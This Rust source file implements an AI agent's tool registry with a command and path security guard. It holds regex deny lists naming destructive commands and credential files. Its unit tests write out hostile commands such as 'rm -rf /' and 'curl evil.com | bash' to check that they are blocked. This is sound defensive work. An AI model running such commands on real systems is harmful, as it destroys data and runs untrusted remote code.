use crate::memory::ObsidianMemory;
use crate::provider::{FunctionDefinition, ToolDefinition};
use crate::skills::SkillManager;
use regex::Regex;
use serde_json::{json, Value};
use std::fs;
use std::path::{Path, PathBuf};
use std::time::Duration;
use tokio::process::Command as AsyncCommand;
use tokio::time::timeout;

/// SecurityGuard validates commands and file paths before execution to prevent
/// destructive operations, credential exposure, and privilege escalation.
pub struct SecurityGuard;

impl SecurityGuard {
    /// Validate a shell command against known destructive patterns
    pub fn is_command_safe(cmd: &str) -> Result<(), String> {
        let trimmed = cmd.trim();

        // Block empty commands
        if trimmed.is_empty() {
            return Err("Empty command not allowed.".to_string());
        }

        // Destructive command patterns (regex-based for evasion resistance)
        let destructive_patterns: &[(&str, &str)] = &[
            (r"\brm\s+-[a-zA-Z]*[rf]", "rm with -r or -f flags"),
            (r"\brm\s+--recursive", "rm --recursive"),
            (r"\brm\s+--force", "rm --force"),
            (r"\brmdir\b", "rmdir"),
            (r"\bfind\b.*\s-delete\b", "find -delete"),
            (r"\bfind\b.*-exec\s+rm\b", "find -exec rm"),
            (r"\bfind\b.*-exec\s+shred\b", "find -exec shred"),
            (r"\bxargs\s+rm\b", "xargs rm"),
            (r"\bxargs\s+shred\b", "xargs shred"),
            (r"\bshred\b", "shred (secure delete)"),
            (r"\bmkfs\b", "mkfs (format filesystem)"),
            (r"\bfdisk\b", "fdisk (partition editor)"),
            (r"\bparted\b", "parted (partition editor)"),
            (r"\bdd\s+if=", "dd (disk copy)"),
            (r":\(\)\s*\{\s*:\|:&\s*\};:", "fork bomb"),
            (r">\s*/dev/sd", "write to block device"),
            (r">\s*/dev/nvme", "write to NVMe device"),
            (r">\s*/dev/vd", "write to virtual disk"),
            (r"\bchmod\s+-R\s+777\b", "chmod -R 777"),
            (r"\bchmod\s+777\b", "chmod 777"),
            (r"\bchown\s+-R\b", "recursive chown"),
            (r"\bcurl\b.*\|\s*bash", "curl | bash (remote execution)"),
            (r"\bwget\b.*\|\s*bash", "wget | bash (remote execution)"),
            (r"\bcurl\b.*\|\s*sh\b", "curl | sh (remote execution)"),
            (r"\bwget\b.*\|\s*sh\b", "wget | sh (remote execution)"),
            (r"\bsudo\s+rm\b", "sudo rm"),
            (r"\bsudo\s+dd\b", "sudo dd"),
            (r"\bsudo\s+mkfs\b", "sudo mkfs"),
            (r"\b>\s*/etc/", "write to /etc/"),
            (r"\bkillall\b", "killall"),
            (r"\bpkill\s+-9\b", "pkill -9"),
            (r"\breboot\b", "reboot"),
            (r"\bshutdown\b", "shutdown"),
            (r"\bpoweroff\b", "poweroff"),
            (r"\binit\s+0\b", "init 0"),
            (r"\bsystemctl\s+(stop|disable|mask)\b", "systemctl stop/disable/mask"),
        ];

        for (pattern, label) in destructive_patterns {
            if let Ok(re) = Regex::new(pattern) {
                if re.is_match(trimmed) {
                    return Err(format!(
                        "[SECURITY BLOCKED]: Command blocked — matched dangerous pattern: {} ('{}')",
                        label, pattern
                    ));
                }
            }
        }

        // Block piping to interpreter shells from network commands
        if (trimmed.contains("curl") || trimmed.contains("wget"))
            && (trimmed.contains("| bash")
                || trimmed.contains("| sh")
                || trimmed.contains("|bash")
                || trimmed.contains("|sh"))
        {
            return Err(
                "[SECURITY BLOCKED]: Piping network content to a shell interpreter is blocked."
                    .to_string(),
            );
        }

        Ok(())
    }

    /// Validate a file path for read or write access
    pub fn is_path_safe(path_str: &str, is_write: bool) -> Result<PathBuf, String> {
        let path = Path::new(path_str);

        // Disallow direct reads/writes to critical system security files
        let forbidden_paths = [
            "/etc/shadow",
            "/etc/gshadow",
            "/etc/sudoers",
            "/etc/passwd-",
            ".ssh/id_rsa",
            ".ssh/id_ed25519",
            ".ssh/id_ecdsa",
            ".ssh/id_dsa",
            ".ssh/authorized_keys",
            ".gnupg/",
            ".aws/credentials",
            ".kube/config",
        ];

        for forbidden in &forbidden_paths {
            if path_str.contains(forbidden) {
                return Err(format!(
                    "[SECURITY BLOCKED]: Access to sensitive path '{}' is prohibited.",
                    forbidden
                ));
            }
        }

        if is_write {
            // Block direct writes to critical OS paths
            let system_roots = [
                "/boot",
                "/sys",
                "/proc",
                "/dev",
                "/usr/bin",
                "/usr/sbin",
                "/usr/lib",
                "/usr/local/bin",
                "/usr/local/sbin",
                "/sbin",
                "/bin",
                "/etc",
                "/var/run",
                "/run",
            ];
            for root in &system_roots {
                if path_str.starts_with(root) {
                    return Err(format!(
                        "[SECURITY BLOCKED]: Write access to system path '{}' is prohibited.",
                        root
                    ));
                }
            }
        }

        Ok(path.to_path_buf())
    }
}

/// Registry of all tools available to the agent
pub struct ToolRegistry;

impl ToolRegistry {
    /// Return all tool definitions for the LLM tool-calling interface
    pub fn get_definitions() -> Vec<ToolDefinition> {
        vec![
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "execute_command".to_string(),
                    description: "Execute a shell command on the local Linux system with security sandbox checks and timeout protection".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "command": {
                                "type": "string",
                                "description": "The exact shell command to execute"
                            }
                        },
                        "required": ["command"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "read_file".to_string(),
                    description: "Read the contents of a text file (optionally a specific line range)".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "Absolute or relative file path to read"
                            },
                            "start_line": {
                                "type": "integer",
                                "description": "Optional start line number (1-based)"
                            },
                            "end_line": {
                                "type": "integer",
                                "description": "Optional end line number (inclusive)"
                            }
                        },
                        "required": ["path"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "write_file".to_string(),
                    description: "Create or overwrite a file with the given content".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "File path to create or overwrite"
                            },
                            "content": {
                                "type": "string",
                                "description": "Text content to write"
                            }
                        },
                        "required": ["path", "content"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "append_file".to_string(),
                    description: "Append content to an existing file or create it if missing. Use this to construct large files (>200 lines) incrementally across multiple steps without exceeding model token limits.".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "File path to append content to"
                            },
                            "content": {
                                "type": "string",
                                "description": "Text content to append"
                            }
                        },
                        "required": ["path", "content"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "edit_file".to_string(),
                    description: "Find and replace a target substring inside a file".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "File path to edit"
                            },
                            "target": {
                                "type": "string",
                                "description": "Exact text substring to find"
                            },
                            "replacement": {
                                "type": "string",
                                "description": "Replacement text"
                            }
                        },
                        "required": ["path", "target", "replacement"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "list_dir".to_string(),
                    description: "List directory contents with file types".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "Directory path to list"
                            }
                        },
                        "required": ["path"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "obsidian_search".to_string(),
                    description: "Full-text search across all Markdown files in the Obsidian vault".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "query": {
                                "type": "string",
                                "description": "Keyword or phrase to search for"
                            }
                        },
                        "required": ["query"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "obsidian_read".to_string(),
                    description: "Read a Markdown note from the Obsidian vault by relative path".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "note_path": {
                                "type": "string",
                                "description": "Relative path to note (e.g. 'Daily/2026-11-03' or 'Architecture/my-project')"
                            }
                        },
                        "required": ["note_path"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "obsidian_write".to_string(),
                    description: "Create or overwrite a Markdown note in the Obsidian vault".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "note_path": {
                                "type": "string",
                                "description": "Relative path for the note (e.g. 'Projects/QSL.md')"
                            },
                            "content": {
                                "type": "string",
                                "description": "Markdown content to write"
                            }
                        },
                        "required": ["note_path", "content"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "obsidian_list".to_string(),
                    description: "List notes in the Obsidian vault (optionally filtered by subfolder)".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "subfolder": {
                                "type": "string",
                                "description": "Optional subfolder inside vault to list"
                            }
                        }
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "obsidian_append".to_string(),
                    description: "Append a fact, preference, or observation to the agent's long-term memory store".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "memory": {
                                "type": "string",
                                "description": "The fact, lesson, preference, or observation to remember"
                            }
                        },
                        "required": ["memory"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "skill_list".to_string(),
                    description: "List all specialized skills available to the agent".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {}
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "skill_read".to_string(),
                    description: "Read the detailed procedural guidelines for a specific skill".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "name": {
                                "type": "string",
                                "description": "Skill name (e.g. 'codebase-inspection', 'security-audit')"
                            }
                        },
                        "required": ["name"]
                    }),
                },
            },
            ToolDefinition {
                tool_type: "function".to_string(),
                function: FunctionDefinition {
                    name: "skill_create".to_string(),
                    description: "Create and persist a new operational skill with instructions".to_string(),
                    parameters: json!({
                        "type": "object",
                        "properties": {
                            "name": {
                                "type": "string",
                                "description": "Unique slug for the skill (e.g. 'docker-optimization')"
                            },
                            "description": {
                                "type": "string",
                                "description": "One-line description of the skill"
                            },
                            "tags": {
                                "type": "array",
                                "items": { "type": "string" },
                                "description": "Tags describing the skill domain"
                            },
                            "instructions": {
                                "type": "string",
                                "description": "Full Markdown instructions and procedures for this skill"
                            }
                        },
                        "required": ["name", "description", "instructions"]
                    }),
                },
            },
        ]
    }

    /// Execute a tool call by name with JSON arguments
    pub async fn execute(
        name: &str,
        args_json: &str,
        obsidian: &ObsidianMemory,
        skills: &mut SkillManager,
        timeout_secs: u64,
    ) -> Result<String, String> {
        let args: Value = serde_json::from_str(args_json).map_err(|e| {
            format!("Invalid JSON arguments for tool '{}': {}", name, e)
        })?;

        match name {
            "execute_command" => {
                let cmd = args
                    .get("command")
                    .and_then(|c| c.as_str())
                    .ok_or_else(|| "Missing 'command' argument".to_string())?;

                SecurityGuard::is_command_safe(cmd)?;

                let mut process = AsyncCommand::new("bash");
                process.arg("-c").arg(cmd);

                let timeout_duration = Duration::from_secs(timeout_secs);
                match timeout(timeout_duration, process.output()).await {
                    Ok(Ok(output)) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        let code = output.status.code().unwrap_or(-1);

                        // Cap output to prevent context overflow
                        let stdout_capped = if stdout.len() > 10_000 {
                            format!(
                                "{}\n... [truncated, {} total bytes]",
                                &stdout[..10_000],
                                stdout.len()
                            )
                        } else {
                            stdout.to_string()
                        };

                        let stderr_capped = if stderr.len() > 3_000 {
                            format!(
                                "{}\n... [truncated, {} total bytes]",
                                &stderr[..3_000],
                                stderr.len()
                            )
                        } else {
                            stderr.to_string()
                        };

                        let result = if stderr_capped.trim().is_empty() {
                            format!("Exit Code: {}\n{}", code, stdout_capped)
                        } else {
                            format!(
                                "Exit Code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
                                code, stdout_capped, stderr_capped
                            )
                        };
                        Ok(result)
                    }
                    Ok(Err(e)) => Err(format!("Command spawn error: {}", e)),
                    Err(_) => Err(format!(
                        "Execution timed out after {}s for command: '{}'",
                        timeout_secs, cmd
                    )),
                }
            }
            "read_file" => {
                let path_str = args
                    .get("path")
                    .and_then(|p| p.as_str())
                    .ok_or_else(|| "Missing 'path' argument".to_string())?;

                let safe_path = SecurityGuard::is_path_safe(path_str, false)?;

                if !safe_path.exists() {
                    return Err(format!("File '{}' does not exist.", safe_path.display()));
                }

                if safe_path.is_dir() {
                    return Err(format!("'{}' is a directory, not a file. Use list_dir instead.", safe_path.display()));
                }

                let content = fs::read_to_string(&safe_path)
                    .map_err(|e| format!("Failed to read '{}': {}", safe_path.display(), e))?;

                let start_line = args
                    .get("start_line")
                    .and_then(|l| l.as_u64())
                    .map(|l| l as usize);
                let end_line = args
                    .get("end_line")
                    .and_then(|l| l.as_u64())
                    .map(|l| l as usize);

                if start_line.is_some() || end_line.is_some() {
                    let lines: Vec<&str> = content.lines().collect();
                    let start = start_line.unwrap_or(1).saturating_sub(1);
                    let end = end_line.unwrap_or(lines.len()).min(lines.len());

                    let slice = if start < lines.len() {
                        lines[start..end].join("\n")
                    } else {
                        String::new()
                    };
                    Ok(format!(
                        "[Lines {}-{} of {}]\n{}",
                        start + 1,
                        end,
                        lines.len(),
                        slice
                    ))
                } else {
                    // Cap output for very large files
                    if content.len() > 15_000 {
                        Ok(format!(
                            "{}\n\n[... truncated, showing first 15000 of {} bytes. Use start_line/end_line for specific ranges.]",
                            &content[..15_000],
                            content.len()
                        ))
                    } else {
                        Ok(content)
                    }
                }
            }
            "write_file" => {
                let path_str = args
                    .get("path")
                    .and_then(|p| p.as_str())
                    .ok_or_else(|| "Missing 'path' argument".to_string())?;

                let safe_path = SecurityGuard::is_path_safe(path_str, true)?;
                let content = args
                    .get("content")
                    .and_then(|c| c.as_str())
                    .ok_or_else(|| "Missing 'content' argument".to_string())?;

                if let Some(parent) = safe_path.parent() {
                    let _ = fs::create_dir_all(parent);
                }

                let mut to_write = content.to_string();
                if !to_write.is_empty() && !to_write.ends_with('\n') {
                    to_write.push('\n');
                }

                fs::write(&safe_path, &to_write)
                    .map_err(|e| format!("Failed to write '{}': {}", safe_path.display(), e))?;

                Ok(format!(
                    "File '{}' written successfully ({} bytes).",
                    safe_path.display(),
                    content.len()
                ))
            }
            "append_file" => {
                let path_str = args
                    .get("path")
                    .and_then(|p| p.as_str())
                    .ok_or_else(|| "Missing 'path' argument".to_string())?;

                let safe_path = SecurityGuard::is_path_safe(path_str, true)?;
                let content = args
                    .get("content")
                    .and_then(|c| c.as_str())
                    .ok_or_else(|| "Missing 'content' argument".to_string())?;

                if let Some(parent) = safe_path.parent() {
                    let _ = fs::create_dir_all(parent);
                }

                use std::fs::OpenOptions;
                use std::io::Write as IoWrite;

                let mut file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&safe_path)
                    .map_err(|e| format!("Failed to open '{}' for appending: {}", safe_path.display(), e))?;

                file.write_all(content.as_bytes())
                    .map_err(|e| format!("Failed to append to '{}': {}", safe_path.display(), e))?;

                if !content.ends_with('\n') {
                    let _ = file.write_all(b"\n");
                }

                let new_size = safe_path.metadata().map(|m| m.len()).unwrap_or(0);
                Ok(format!(
                    "Appended {} bytes to '{}' (new total size: {} bytes).",
                    content.len(),
                    safe_path.display(),
                    new_size
                ))
            }
            "edit_file" => {
                let path_str = args
                    .get("path")
                    .and_then(|p| p.as_str())
                    .ok_or_else(|| "Missing 'path' argument".to_string())?;

                let safe_path = SecurityGuard::is_path_safe(path_str, true)?;

                if !safe_path.exists() {
                    return Err(format!("File '{}' does not exist.", safe_path.display()));
                }

                let target = args
                    .get("target")
                    .and_then(|t| t.as_str())
                    .ok_or_else(|| "Missing 'target' argument".to_string())?;

                let replacement = args
                    .get("replacement")
                    .and_then(|r| r.as_str())
                    .unwrap_or("");

                let content = fs::read_to_string(&safe_path)
                    .map_err(|e| format!("Failed to read '{}': {}", safe_path.display(), e))?;

                if !content.contains(target) {
                    return Err(format!(
                        "Target string not found in '{}'. Verify exact whitespace and content.",
                        safe_path.display()
                    ));
                }

                let occurrences = content.matches(target).count();
                let new_content = content.replace(target, replacement);
                fs::write(&safe_path, &new_content)
                    .map_err(|e| format!("Failed to write '{}': {}", safe_path.display(), e))?;

                Ok(format!(
                    "File '{}' edited successfully ({} occurrence(s) replaced).",
                    safe_path.display(),
                    occurrences
                ))
            }
            "list_dir" => {
                let path_str = args
                    .get("path")
                    .and_then(|p| p.as_str())
                    .unwrap_or(".");

                if !Path::new(path_str).exists() {
                    return Err(format!("Directory '{}' does not exist.", path_str));
                }
                if !Path::new(path_str).is_dir() {
                    return Err(format!("'{}' is not a directory.", path_str));
                }

                let entries = fs::read_dir(path_str)
                    .map_err(|e| format!("Failed to list '{}': {}", path_str, e))?;

                let mut list = Vec::new();
                for entry in entries.filter_map(|e| e.ok()) {
                    let file_type = if entry.path().is_dir() {
                        "DIR "
                    } else if entry.path().is_symlink() {
                        "LINK"
                    } else {
                        "FILE"
                    };
                    let name = entry.file_name().to_string_lossy().to_string();
                    list.push(format!("[{}]  {}", file_type, name));
                }
                list.sort();

                if list.is_empty() {
                    Ok(format!("Directory '{}' is empty.", path_str))
                } else {
                    Ok(list.join("\n"))
                }
            }
            "obsidian_search" => {
                let query = args
                    .get("query")
                    .and_then(|q| q.as_str())
                    .ok_or_else(|| "Missing 'query' argument".to_string())?;

                let results = obsidian.search_vault(query);
                if results.is_empty() {
                    Ok(format!("No matches found for '{}' in Obsidian vault.", query))
                } else {
                    let formatted: Vec<String> = results
                        .iter()
                        .map(|(path, line, text)| {
                            format!("{}:{} → {}", path, line, text.trim())
                        })
                        .collect();
                    Ok(format!(
                        "Found {} match(es):\n{}",
                        formatted.len(),
                        formatted.join("\n")
                    ))
                }
            }
            "obsidian_read" => {
                let note = args
                    .get("note_path")
                    .and_then(|n| n.as_str())
                    .ok_or_else(|| "Missing 'note_path' argument".to_string())?;

                obsidian.read_note(note)
            }
            "obsidian_write" => {
                let note = args
                    .get("note_path")
                    .and_then(|n| n.as_str())
                    .ok_or_else(|| "Missing 'note_path' argument".to_string())?;

                let content = args
                    .get("content")
                    .and_then(|c| c.as_str())
                    .ok_or_else(|| "Missing 'content' argument".to_string())?;

                obsidian.write_note(note, content)
            }
            "obsidian_list" => {
                let sub = args.get("subfolder").and_then(|s| s.as_str());
                let notes = obsidian.list_notes(sub);
                if notes.is_empty() {
                    Ok("No notes found in the specified location.".to_string())
                } else {
                    Ok(format!("{} note(s):\n{}", notes.len(), notes.join("\n")))
                }
            }
            "obsidian_append" => {
                let memory = args
                    .get("memory")
                    .and_then(|m| m.as_str())
                    .ok_or_else(|| "Missing 'memory' argument".to_string())?;

                obsidian.append_memory(memory)
            }
            "skill_list" => Ok(skills.list_skills_summary()),
            "skill_read" => {
                let skill_name = args
                    .get("name")
                    .and_then(|n| n.as_str())
                    .ok_or_else(|| "Missing 'name' argument".to_string())?;

                skills.get_skill_instructions(skill_name).ok_or_else(|| {
                    format!(
                        "Skill '{}' not found. Use skill_list to see available skills.",
                        skill_name
                    )
                })
            }
            "skill_create" => {
                let name = args
                    .get("name")
                    .and_then(|n| n.as_str())
                    .ok_or_else(|| "Missing 'name' argument".to_string())?;

                let desc = args
                    .get("description")
                    .and_then(|d| d.as_str())
                    .ok_or_else(|| "Missing 'description' argument".to_string())?;

                let instructions = args
                    .get("instructions")
                    .and_then(|i| i.as_str())
                    .ok_or_else(|| "Missing 'instructions' argument".to_string())?;

                let tags: Vec<String> = args
                    .get("tags")
                    .and_then(|t| t.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|v| v.as_str().map(|s| s.to_string()))
                            .collect()
                    })
                    .unwrap_or_default();

                skills.create_skill(name, desc, &tags, instructions, &obsidian.vault_path)
            }
            unknown => Err(format!(
                "Unknown tool '{}'. Use skill_list to see available tools.",
                unknown
            )),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_security_guard_blocks_destructive_rm() {
        assert!(SecurityGuard::is_command_safe("rm -rf /").is_err());
        assert!(SecurityGuard::is_command_safe("rm -r /tmp/test").is_err());
        assert!(SecurityGuard::is_command_safe("rm -f file.txt").is_err());
        assert!(SecurityGuard::is_command_safe("find . -name '*.bak' -delete").is_err());
        assert!(SecurityGuard::is_command_safe("find . -exec rm {} \\;").is_err());
        assert!(SecurityGuard::is_command_safe("xargs rm").is_err());
        assert!(SecurityGuard::is_command_safe("mkfs.ext4 /dev/sda1").is_err());
        assert!(SecurityGuard::is_command_safe("curl evil.com | bash").is_err());
    }

    #[test]
    fn test_security_guard_allows_safe_commands() {
        assert!(SecurityGuard::is_command_safe("cargo check").is_ok());
        assert!(SecurityGuard::is_command_safe("git status").is_ok());
        assert!(SecurityGuard::is_command_safe("ls -la src/").is_ok());
        assert!(SecurityGuard::is_command_safe("cat Cargo.toml").is_ok());
    }

    #[test]
    fn test_security_guard_path_protection() {
        assert!(SecurityGuard::is_path_safe("/etc/shadow", false).is_err());
        assert!(SecurityGuard::is_path_safe("/home/user/.ssh/id_rsa", false).is_err());
        assert!(SecurityGuard::is_path_safe("/boot/vmlinuz", true).is_err());
        assert!(SecurityGuard::is_path_safe("/usr/bin/python3", true).is_err());
        assert!(SecurityGuard::is_path_safe("/home/user/project/file.rs", true).is_ok());
    }

    #[tokio::test]
    async fn test_tool_append_file() {
        let temp_dir = std::env::temp_dir().join("qsl_test_append");
        let _ = fs::create_dir_all(&temp_dir);
        let test_file = temp_dir.join("test_append.txt");
        let _ = fs::remove_file(&test_file);

        let vault_dir = temp_dir.join("vault");
        let memory = ObsidianMemory::new(&vault_dir);
        let mut skills = SkillManager::new(&vault_dir);

        let write_args = json!({
            "path": test_file.to_string_lossy(),
            "content": "line 1\n"
        })
        .to_string();

        let _ = ToolRegistry::execute("write_file", &write_args, &memory, &mut skills, 10).await.unwrap();

        let append_args = json!({
            "path": test_file.to_string_lossy(),
            "content": "line 2\n"
        })
        .to_string();

        let append_res = ToolRegistry::execute("append_file", &append_args, &memory, &mut skills, 10).await.unwrap();
        assert!(append_res.contains("Appended"));

        let final_content = fs::read_to_string(&test_file).unwrap();
        assert_eq!(final_content, "line 1\nline 2\n");
        let _ = fs::remove_file(&test_file);
        let _ = fs::remove_dir_all(&temp_dir);
    }
}
